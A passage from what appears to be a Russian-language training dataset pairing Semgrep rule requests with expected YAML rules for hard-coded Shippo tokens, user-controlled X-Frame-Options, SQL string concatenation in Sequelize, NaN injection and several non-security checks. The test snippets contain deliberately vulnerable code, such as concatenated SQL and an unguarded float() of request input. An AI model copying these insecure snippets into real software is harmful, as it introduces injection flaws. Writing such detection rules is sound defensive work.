    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: shippo-api-token.go\n// ruleid: shippo-api-token\nshippo_api_token = \"shippo_live_1a7a0d51772feb7acd1d879a9afa711390fef924\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: shippo-api-token\nshippo_api_token = \"shippo_live_1a7a0d51772feb7acd1d879a9afa711390fef924\"\n• // ruleid: shippo-api-token\nconst shippoApiToken = 'shippo_test_abc123def456ghijklmnopqrstuvwx';\n• // ruleid: shippo-api-token\nlet shippoToken = `shippo_live_abcdefg1234567890hijklmn`;\n\nБезопасные паттерны:  \n• func getShippoToken() {\n  return os.Getenv(\"SHIPPO_API_TOKEN\")\n}\n• var shippoToken string\nif config.HasKey(\"shippo_token\") {\n  shippoToken = config.GetString(\"shippo_token\")\n}\n• const shippoAPIEndpoint = \"https://api.shippo.com/v1/\"\n\nЛегенда аннотаций:\n- // ruleid:shippo-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:shippo-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: shippo-api-token\n  message: A gitleaks shippo-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)\\b(shippo_(live|test)_[a-f0-9]{40})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило выполняет поиск регулярного выражения в исходном коде, нацеленное на обнаружение жестко закодированных токенов Shippo API. Паттерн использует модификатор case-insensitive для поиска строк, начинающихся с 'shippo_' и следующих за ними live или test, после которых идет последовательность из 40 шестнадцатеричных символов. Правило также учитывает различные разделители, такие как одинарные и двойные кавычки, символы новой строки, табуляции и другие специальные символы, которые могут использоваться для разделения токена от окружающего контекста.\n\n# Ключевые элементы:\n- ID: shippo-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "shippo-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: x-frame-options-misconfiguration\nОписание уязвимости: By letting user input control `X-Frame-Options` header, there is a risk that software does not properly verify whether or not a browser should be allowed to render a page in an `iframe`.\nCWE: CWE-451: User Interface (UI) Misrepresentation of Critical Information\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-451: User Interface (UI) Misrepresentation of Critical Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: x-frame-options-misconfiguration.js\nvar express = require('express'),\n    app = express();\n\napp.get('/', function (req, res) {\n    // ruleid: x-frame-options-misconfiguration\n    res.set('X-Frame-Options', req.query.opts)\n    res.send('ok')\n})\n\napp.get('/', function (req, res) {\n    // ok: x-frame-options-misconfiguration\n    res.set('X-Frame-Options', 'SAMEORIGIN')\n    res.send('ok')\n})  # Ограничиваем длину\n\nОпасные паттерны:\n• res.set('X-Frame-Options', req.query.opts)\n• res.set('X-Frame-Options', req.body.frameOption)\n\nБезопасные паттерны:  \n• res.set('X-Frame-Options', 'SAMEORIGIN')\n• res.set('X-Frame-Options', 'DENY')\n\nЛегенда аннотаций:\n- // ruleid:x-frame-options-misconfiguration: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:x-frame-options-misconfiguration: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: x-frame-options-misconfiguration\n  message: >-\n    By letting user input control `X-Frame-Options` header,\n    there is a risk that software does not properly verify whether or not a browser should be allowed\n    to render a page in\n    an `iframe`.\n  metadata:\n    references:\n    - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n    owasp:\n    - A04:2021 - Insecure Design\n    cwe:\n    - 'CWE-451: User Interface (UI) Misrepresentation of Critical Information'\n    category: security\n    technology:\n    - express\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: function ... ($REQ, $RES) {...}\n      - pattern-inside: function ... ($REQ, $RES, $NEXT) {...}\n      - patterns:\n        - pattern-either:\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES) {...})\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, $NEXT) {...})\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: ^(get|post|put|head|delete|options)$\n    - pattern-either:\n      - pattern: $REQ.query\n      - pattern: $REQ.body\n      - pattern: $REQ.params\n      - pattern: $REQ.cookies\n      - pattern: $REQ.headers\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response, $NEXT: NextFunction) =>\n          {...}\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response) => {...}\n    - focus-metavariable: $REQ\n    - pattern-either:\n      - pattern: params\n      - pattern: query\n      - pattern: cookies\n      - pattern: headers\n      - pattern: body\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: $RES.set($HEADER, ...)\n      - pattern: $RES.header($HEADER, ...)\n      - pattern: $RES.setHeader($HEADER, ...)\n      - pattern: |\n          $RES.set({$HEADER: ...}, ...)\n      - pattern: |\n          $RES.writeHead($STATUS, {$HEADER: ...}, ...)\n    - metavariable-regex:\n        metavariable: $HEADER\n        regex: .*(X-Frame-Options|x-frame-options).*\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда значение заголовка X-Frame-Options устанавливается на основе пользовательского ввода без надлежащей проверки. Анализ выполняется методом taint, где источники (sources) включают запросы, тела запросов, параметры URL, куки и заголовки HTTP-запросов. Синки (sinks) определяются путем поиска установок заголовков с использованием различных методов, таких как set, header, setHeader и writeHead, при условии, что имя заголовка содержит подстроку 'X-Frame-Options' или 'x-frame-options'. Правило применимо к JavaScript и TypeScript-кодам.\n\n# Ключевые элементы:\n- ID: x-frame-options-misconfiguration\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "x-frame-options-misconfiguration",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: dict-del-while-iterate\nОписание уязвимости: It appears that `$DICT[$KEY]` is a dict with items being deleted while in a for loop. This is usually a bad idea and will likely lead to a RuntimeError: dictionary changed size during iteration\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: dict-modify-iterating.py\nd = {'a': 1, 'b': 2}\n# ruleid:dict-del-while-iterate\nfor k,v in d.items():\n    del d[k]\n\nd = {'a': 1, 'b': 2}\n# ruleid:dict-del-while-iterate\nfor k in d.keys():\n    del d[k]\n\n# ruleid:dict-del-while-iterate\nfor k in d.keys():\n    print(d[k])\n    del d[k]\n\n# ok:dict-del-while-iterate\nfor k in d.keys():\n    print(d[k])\n    x = d[k]  # Ограничиваем длину\n\nОпасные паттерны:\n• for k,v in d.items():\n    del d[k]\n• for k in d.keys():\n    del d[k]\n• for k in d.keys():\n    print(d[k])\n    del d[k]\n\nБезопасные паттерны:  \n• for k in d.keys():\n    print(d[k])\n    x = d[k]\n• for k,v in d.items():\n    #some code\n\n• for key in some_dict:\n    if condition:\n        del some_dict[key]\n\nЛегенда аннотаций:\n- // ruleid:dict-del-while-iterate: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dict-del-while-iterate: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: dict-del-while-iterate\n    message:\n      \"It appears that `$DICT[$KEY]` is a dict with items being deleted while in a for loop. This is usually a bad idea\n      and will likely lead to a RuntimeError: dictionary changed size during iteration\"\n    metadata:\n      references:\n        - https://docs.python.org/3/library/stdtypes.html#dictionary-view-objects\n      category: correctness\n      technology:\n        - python\n    languages: [python]\n    severity: WARNING\n    pattern-either:\n      - pattern: |\n          for $KEY, $VALUE in $DICT.items():\n              ...\n              del $DICT[$KEY]\n      - pattern: |\n          for $KEY in $DICT.keys():\n              ...\n              del $DICT[$KEY]\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ситуаций, когда словарь модифицируется во время итерации по нему. Анализ выполняется путем поиска конструкций цикла for, которые используют методы .items() или .keys() для итерации по словарю, при этом внутри цикла производится удаление элементов с использованием оператора del. Это может привести к ошибке времени выполнения, так как изменение размера словаря во время итерации не допускается.\n\n# Ключевые элементы:\n- ID: dict-del-while-iterate\n- Язык: python \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "dict-del-while-iterate",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: missing-no-install-recommends\nОписание уязвимости: This 'apt-get install' is missing '--no-install-recommends'. This prevents unnecessary packages from being installed, thereby reducing image size. Add '--no-install-recommends'.\nCWE: \nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: missing-no-install-recommends.dockerfile\nFROM debian\n# ruleid: missing-no-install-recommends\nRUN apt-get install semgrep=0.30.0\n\n# ruleid: missing-no-install-recommends\nRUN apt-get install -y python=2.7 semgrep\n\n# ok: missing-no-install-recommends\nRUN apt-get install semgrep --no-install-recommends\n\n# ok: missing-no-install-recommends\nRUN apt-get install semgrep --no-install-recommends -y\n\n# ok: missing-no-install-recommends\nRUN apt-get install --no-install-recommends semgrep\n\n# ok: missing-no-install-recommends\nRUN apt-get install --no-install-recommends -y python=2.7 semgrep\n\n# ok: missing-no-install-recommends\nRUN apt-get install -y --no-install-recommends python=2.7\n\n# ok: missing-no-install-recommends\nRUN apt-get update \\\n    && apt-get install -y --no-install-recommends \\\n    python3 \\\n    python3-pip \\\n    python3-setuptools \\\n    libpython3-dev \\\n    python3-dev \\\n    git \\\n    ca-certificates \\\n    zip \\\n    jq \\\n    && apt-get clean \\\n    && rm -rf /var/lib/apt/lists/*\n\n# ruleid: missing-no-install-recommends\nRUN apt-get update \\\n    && apt-get install \\\n    python3 \\\n    python3-pip \\\n    python3-setuptools \\\n    libpython3-dev \\\n    python3-dev \\\n    git \\\n    ca-certificates \\\n    zip \\\n    jq \\\n    && apt-get clean \\\n    && rm -rf /var/lib/apt/lists/*\n\n# ruleid: missing-no-install-recommends\nRUN apt-get update \\\n    && apt-get install --assume-yes \\\n    python3 \\\n    python3-pip \\\n    python3-setuptools \\\n    libpython3-dev \\\n    python3-dev \\\n    git \\\n    ca-certificates \\\n    zip \\\n    jq \\\n    && apt-get clean \\\n    && rm -rf /var/lib/apt/lists/*  # Ограничиваем длину\n\nОпасные паттерны:\n• RUN apt-get install semgrep=0.30.0\n• RUN apt-get install -y python=2.7 semgrep\n\nБезопасные паттерны:  \n• RUN apt-get install semgrep --no-install-recommends\n• RUN apt-get install semgrep --no-install-recommends -y\n\nЛегенда аннотаций:\n- // ruleid:missing-no-install-recommends: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-no-install-recommends: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: missing-no-install-recommends\n    patterns:\n      - pattern: |\n          RUN apt-get install ...\n      - pattern-not:\n          RUN apt-get install ... --no-install-recommends ...\n    languages: [dockerfile]\n    message: >-\n      This 'apt-get install' is missing '--no-install-recommends'. This prevents\n      unnecessary packages from being installed, thereby reducing image size. Add\n      '--no-install-recommends'.\n    severity: INFO\n    metadata:\n      source-rule-url: https://github.com/hadolint/hadolint/wiki/DL3015\n      references:\n        - https://github.com/hadolint/hadolint/wiki/DL3015\n      category: best-practice\n      technology:\n        - dockerfile\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска инструкций RUN в Dockerfile, которые используют команду 'apt-get install' без параметра '--no-install-recommends'. Правило использует шаблон для поиска команд 'apt-get install', а затем исключает случаи, когда параметр '--no-install-recommends' явно указан. Это позволяет обнаружить ситуации, где установка рекомендуемых пакетов может привести к увеличению размера образа контейнера.\n\n# Ключевые элементы:\n- ID: missing-no-install-recommends\n- Язык: dockerfile \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "missing-no-install-recommends",
      "language": "dockerfile",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения gcp-gke-ensure-integrity-monitoring\nОписание уязвимости: Ensure Integrity Monitoring for Shielded GKE Nodes is Enabled\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-gke-ensure-integrity-monitoring.tf\n# fail\n# ruleid: gcp-gke-ensure-integrity-monitoring\nresource \"google_container_cluster\" \"fail1\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n  network    = var.network\n  subnetwork = var.subnetwork\n\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block       = var.ip_allocation_policy[\"cluster_ipv4_cidr_block\"]\n    cluster_secondary_range_name  = var.ip_allocation_policy[\"cluster_secondary_range_name\"]\n    services_ipv4_cidr_block      = var.ip_allocation_policy[\"services_ipv4_cidr_block\"]\n    services_secondary_range_name = var.ip_allocation_policy[\"services_secondary_range_name\"]\n  }\n\n  remove_default_node_pool = var.remove_default_node_pool\n\n  node_config {\n    workload_metadata_config {\n      node_metadata = \"GKE_METADATA_SERVER\"\n    }\n\n    shielded_instance_config {\n      enable_integrity_monitoring = false\n    }\n  }\n\n\n  release_channel {\n    channel = var.release_channel\n  }\n\n  master_auth {\n\n    client_certificate_config {\n      issue_client_certificate = false\n    }\n  }\n\n  addons_config {\n    http_load_balancing {\n      disabled = var.http_load_balancing_disabled\n    }\n\n    network_policy_config {\n      disabled = var.network_policy_config_disabled\n    }\n  }\n\n  maintenance_policy {\n    daily_maintenance_window {\n      start_time = var.maintenance_window\n    }\n  }\n\n  private_cluster_config {\n    enable_private_nodes    = var.private_cluster_config[\"enable_private_nodes\"]\n    enable_private_endpoint = var.private_cluster_config[\"enable_private_endpoint\"]\n    master_ipv4_cidr_block  = var.private_cluster_config[\"master_ipv4_cidr_block\"]\n  }\n\n  master_authorized_networks_config {\n    cidr_blocks {\n      cidr_block = var.master_authorized_network_cidr\n    }\n  }\n\n  network_policy {\n    enabled = true\n  }\n\n  pod_security_policy_config {\n    enabled = var.pod_security_policy_config_enabled\n  }\n\n  resource_labels =  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_container_cluster\" \"fail1\" { ... node_config { ... shielded_instance_config { enable_integrity_monitoring = false } ... } ... }\n• resource \"google_container_cluster\" \"fail2\" { ... node_config { ... shielded_instance_config { enable_integrity_monitoring = var.enable_integrity_monitoring where var.enable_integrity_monitoring == fa\n\nБезопасные паттерны:  \n• resource \"google_container_cluster\" \"success1\" { ... node_config { ... shielded_instance_config { enable_integrity_monitoring = true } ... } ... }\n• resource \"google_container_cluster\" \"success2\" { ... node_config { ... shielded_instance_config { enable_integrity_monitoring = var.enable_integrity_monitoring where var.enable_integrity_monitoring ==\n\nЛегенда аннотаций:\n- // ruleid:gcp-gke-ensure-integrity-monitoring: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-gke-ensure-integrity-monitoring: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-gke-ensure-integrity-monitoring\n  patterns:\n  - pattern-inside: |\n      resource \"google_container_cluster\" $ANYTHING {\n        ...\n        node_config {\n          ...\n          shielded_instance_config {\n            enable_integrity_monitoring = false\n          }\n          ...\n        }     \n        ...\n      }\n  message: Ensure Integrity Monitoring for Shielded GKE Nodes is Enabled\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    technology:\n    - terraform\n    - gcp\n    category: security\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Google Kubernetes Engine (GKE) кластеров, где опция integrity monitoring для защищенных узлов отключена. Анализируется наличие ресурса google_container_cluster с блоком node_config внутри которого присутствует поле shielded_instance_config с параметром enable_integrity_monitoring равным false. Правило использует шаблон pattern-inside для поиска вложенного блока конфигурации, соответствующего условиям уязвимости.\n\n# Ключевые элементы:\n- ID: gcp-gke-ensure-integrity-monitoring\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-gke-ensure-integrity-monitoring",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: use-count-method\nОписание уязвимости: Looks like you need to determine the number of records. Django provides the count() method which is more efficient than .len(). See https://docs.djangoproject.com/en/3.0/ref/models/querysets/\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: upsell-count.py\n# ruleid:use-count-method\nprint(Entry.objects.all().len())\n# ruleid:use-count-method\nprint(Entry.objects.get().filter().len())\n# ruleid:use-count-method\nprint(Entry.objects.filter().filter().len())  # Ограничиваем длину\n\nОпасные паттерны:\n• print(Entry.objects.all().len())\n• print(Entry.objects.get().filter().len())\n• print(Entry.objects.filter().filter().len())\n\nБезопасные паттерны:  \n• print(Entry.objects.all().count())\n• print(len(Entry.objects.all()))\n• print(Entry.objects.filter(name='test').count())\n\nЛегенда аннотаций:\n- // ruleid:use-count-method: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-count-method: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: use-count-method\n    message:\n      Looks like you need to determine the number of records. Django provides the count() method which is more efficient\n      than .len(). See https://docs.djangoproject.com/en/3.0/ref/models/querysets/\n    languages: [python]\n    severity: ERROR\n    pattern-either:\n      - pattern: $X.objects.$FUNC(...).len()\n      - pattern: $X.objects.$FUNC(...).$FILTER().len()\n      - pattern: $X.objects.$FUNC(...).$FILTER().$UPDATE(...).len()\n    metadata:\n      category: performance\n      technology:\n        - django\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода len() вместо более эффективного count() в Django QuerySets. Анализ выполняется путем поиска вызовов методов, заканчивающихся на '.len()', где объект является экземпляром класса, производного от 'QuerySet'. Правило использует шаблон 'pattern-either' для охвата различных комбинаций методов и фильтров, применяемых к объектам QuerySet.\n\n# Ключевые элементы:\n- ID: use-count-method\n- Язык: python \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "use-count-method",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: sequelize-raw-query\nОписание уязвимости: Avoiding SQL string concatenation: untrusted input concatenated with raw SQL query can result in SQL Injection. Data replacement or data binding should be used. See https://sequelize.org/master/manual/raw-queries.html\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: sequelize-raw-query.js\n// Case1: run query by string concatenation using template literals\n// ruleid: sequelize-raw-query\ndb.sequelize.query(\n  `INSERT INTO user (username, password) VALUES('${username}','${password}')`\n)\n\n// Case 2: Build query by string concatenation using template literals\n// ruleid: sequelize-raw-query\nvar query = `INSERT INTO user (username, password) VALUES('${username}','${password}')`\nconsole.log(\"check password\");\ndb.sequelize.query(query)\n\n\n// Case 3: run query by string concatenation using + operator\n// ruleid: sequelize-raw-query\ndb.sequelize.query(\n  \"INSERT INTO user (username, password) VALUES('\" + username + \"','\" + password + \"')\"\n)\n\n// Case 4: Build query by string concatenation using + operator\n// ruleid: sequelize-raw-query\nvar query = \"INSERT INTO user (username, password) VALUES('\" + username + \"','\" + password + \"')\"\nconsole.log(\"check password\");\ndb.sequelize.query(query)  # Ограничиваем длину\n\nОпасные паттерны:\n• db.sequelize.query(\n  `INSERT INTO user (username, password) VALUES('${username}','${password}')`\n)\n• var query = `INSERT INTO user (username, password) VALUES('${username}','${password}')`\nconsole.log(\"check password\");\ndb.sequelize.query(query)\n• db.sequelize.query(\n  \"INSERT INTO user (username, password) VALUES('\" + username + \"','\" + password + \"')\"\n)\n\nБезопасные паттерны:  \n• db.sequelize.query(\n  sequelize.literal(`SELECT * FROM users WHERE username = :username AND password = :password`), {\n    replace: { username: username, password: password }\n})\n\n• let query = sequelize.literal(`SELECT * FROM users WHERE username = :username AND password = :password`)\nquery.replace({ username: username, password: password })\ndb.sequelize.query(query)\n• db.sequelize.query(\n  'SELECT * FROM users WHERE username = :username AND password = :password', \n  { replace: { username: username, password: password } }\n)\n\nЛегенда аннотаций:\n- // ruleid:sequelize-raw-query: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:sequelize-raw-query: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: sequelize-raw-query\n  message: >-\n    Avoiding SQL string concatenation: untrusted input concatenated with raw\n    SQL query can result in SQL Injection. Data replacement or data binding\n    should be used.\n    See https://sequelize.org/master/manual/raw-queries.html\n  metadata:\n    category: security\n    technology:\n    - sequelize\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://sequelize.org/master/manual/raw-queries.html\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  pattern-either:\n  - pattern: |\n      $DATABASE.sequelize.query(`...${...}...`, ...)\n  - pattern: |\n      $QUERY = `...${...}...`\n      ...\n      $DATABASE.sequelize.query($QUERY, ...)\n  - pattern: |\n      $DATABASE.sequelize.query($SQL + $VALUE, ...)\n  - pattern: |\n      $QUERY = $SQL + $VALUE\n      ...\n      $DATABASE.sequelize.query($QUERY, ...)\n  - pattern: |\n      Sequelize.literal(`...${...}...`)\n  - pattern: |\n      $QUERY = `...${...}...`\n      ...\n      Sequelize.literal($QUERY)\n  - pattern: |\n      Sequelize.literal($SQL + $VALUE)\n  - pattern: |\n      $QUERY = $SQL + $VALUE\n      ...\n      Sequelize.literal($QUERY)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимостей SQL-инъекции, вызванных конкатенацией необработанных пользовательских вводов с сырыми SQL-запросами в библиотеке sequelize. Анализируются два типа шаблонов: строковая конкатенация с использованием шаблонных литералов (``...) или оператора (+), а также использование метода literal() библиотеки sequelize. Опасный код включает прямую вставку пользовательского ввода в SQL-запросы без предварительной обработки, что позволяет злоумышленникам выполнять произвольные SQL-команды. Безопасный код использует методы замены данных или привязки параметров, предоставляемые библиотекой sequelize для защиты от SQL-инъекций.\n\n# Ключевые элементы:\n- ID: sequelize-raw-query\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "sequelize-raw-query",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: nan-injection\nОписание уязвимости: Found user input going directly into typecast for bool(), float(), or complex(). This allows an attacker to inject Python's not-a-number (NaN) into the typecast. This results in undefind behavior, particularly when doing comparisons. Either cast to a different type, or add a guard checking for all capitalizations of the string 'nan'.\nCWE: CWE-704: Incorrect Type Conversion or Cast\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-704: Incorrect Type Conversion or Cast\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: nan-injection.py\nimport models\nfrom django.http import HttpResponse\nfrom app import get_price, deny, buy, fetch_obj\n\n\nclass Person(models.Model):\n    first_name = models.CharField(...)\n    last_name = models.CharField(...)\n    birth_date = models.DateField(...)\n\n\n##### True Positives #########\ndef test1(request):\n    tid = request.POST.get(\"tid\")\n\n    price = get_price()\n\n    # ruleid: nan-injection\n    x = float(tid)\n\n    if x < price:\n        return deny()\n    return buy()\n\ndef test2(request):\n    tid = request.POST.get(\"tid\")\n\n    # ruleid: nan-injection\n    bool(tid)\n\n    # ruleid: nan-injection\n    complex(tid)\n\ndef test3(request, something_else):\n    tid = request.GET['tid']\n\n    # ruleid: nan-injection\n    float(tid)\n\n    # ruleid: nan-injection\n    bool(tid)\n\n    # ruleid: nan-injection\n    complex(tid)\n\ndef ok1(request, something_else):\n    tid = request.POST.get(\"tid\")\n\n    obj = fetch_obj(tid)\n\n    # ok: nan-injection\n    float(obj.num)\n\ndef ok2(request, something_else):\n    tid = request.POST.get(\"tid\")\n\n    # ok: nan-injection\n    int(float(tid))\n\n    # ok: nan-injection\n    float(int(tid))\n\n    # ok: nan-injection\n    int(bool(tid))\n\ndef ok3(request):\n    tid = request.POST.get(\"tid\")\n\n    if tid.lower() == \"nan\":\n        raise ValueError\n\n    # ok: nan-injection \n    num = float(tid)\n    if num > get_price():\n        buy()\n    deny()  # Ограничиваем длину\n\nОпасные паттерны:\n• x = float(tid)\n• bool(tid)\n• complex(tid)\n\nБезопасные паттерны:  \n• float(obj.num)\n• int(float(tid))\n• float(int(tid))\n\nЛегенда аннотаций:\n- // ruleid:nan-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:nan-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: nan-injection\n  message: Found user input going directly into typecast for bool(), float(), or complex(). This allows an\n    attacker to inject Python's not-a-number (NaN) into the typecast. This results in undefind behavior,\n    particularly when doing comparisons. Either cast to a different type, or add a guard checking for\n    all capitalizations of the string 'nan'.\n  languages:\n  - python\n  severity: ERROR\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-inside: |\n        def $FUNC(request, ...):\n          ...\n    - pattern-either:\n      - pattern: request.$PROPERTY.get(...)\n      - pattern: request.$PROPERTY[...]\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: float(...)\n      - pattern: bool(...)\n      - pattern: complex(...)\n    - pattern-not-inside: |\n        if $COND:\n          ...\n        ...\n  pattern-sanitizers:\n  - pattern: $ANYTHING(...)\n    not_conflicting: true\n  metadata:\n    references:\n    - https://discuss.python.org/t/nan-breaks-min-max-and-sorting-functions-a-solution/2868\n    - https://blog.bitdiscovery.com/2021/12/python-nan-injection/\n    category: security\n    cwe:\n    - 'CWE-704: Incorrect Type Conversion or Cast'\n    technology:\n    - django\n    subcategory:\n    - vuln\n    impact: MEDIUM\n    likelihood: MEDIUM\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ситуаций, когда пользовательский ввод напрямую передается в типовые преобразования типа float(), bool() или complex(). Это позволяет злоумышленнику внедрить NaN (не число) в преобразование типа, что приводит к неопределенному поведению при сравнении. Правило использует шаблон источников для захвата переменных, полученных через HTTP-запросы, и шаблоны стоков для выявления вызовов функций float(), bool() и complex(). Исключения обрабатываются путем проверки наличия функции, которая явно проверяет строку 'nan' перед выполнением преобразования.\n\n# Ключевые элементы:\n- ID: nan-injection\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "nan-injection",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
